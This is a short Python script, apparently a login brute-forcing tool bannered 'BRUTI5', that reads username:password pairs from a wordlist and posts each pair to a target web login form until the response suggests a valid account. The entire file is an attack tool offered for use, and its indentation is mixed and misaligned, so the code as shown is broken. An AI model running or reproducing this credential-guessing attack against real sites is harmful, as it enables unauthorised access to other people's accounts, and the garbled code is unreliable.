import sys
import getopt
import requests
import pyfiglet

def print_banner(text):
    display_banner = pyfiglet.figlet_format(text)
    print(display_banner)
    

def main(argv):
    url = ''
    password_file = ''
    try:
        opts, args = getopt.getopt(argv, "t:w:", ["target=", "wlist="])
    except getopt.GetoptError:
        print('test.py -t <target> -w <wordlist>')
        sys.exit(2)
        
    with requests.Session() as session:
        for opt, arg in opts:
            if opt in ("-t", "--target"):
                url = arg
            elif opt in ("-w", "--wlist"):
                password_file = arg
                with open(password_file, "r") as file:
                    for line in file:
                        parts = line.strip().split(':')
                        if len(parts) >= 2:
                            user, password = parts[:2]
                            data = {'user_name': user, 'user_pwd': password, 'login': 'Sign+In'}
                            send_data_url = session.post(url, data=data)
                            if send_data_url.status_code == 200:   
                            		print("[*] Attempting username : password: {0} is {1}".format(user, password))
                            		print(send_data_url.text)
                            		if "Username does not exist" in send_data_url.text:
                            			print("TRYING PWD------------------------------------------>")
                                        else:
                            	             print("[*] username : Password ---------is-------- found: {0} is {1}".format(user, password))
                            	             sys.exit(1) #exit
                        else:
                            print("Invalid format in line:", line.strip())

                            # error response content 
                            if send_data_url.status_code != 200:
                                print("Error response:", send_data_url.text)

if __name__ == "__main__":
    banner_text = "--BRUTI5-- @$if"
    print_banner(banner_text)
    main(sys.argv[1:])
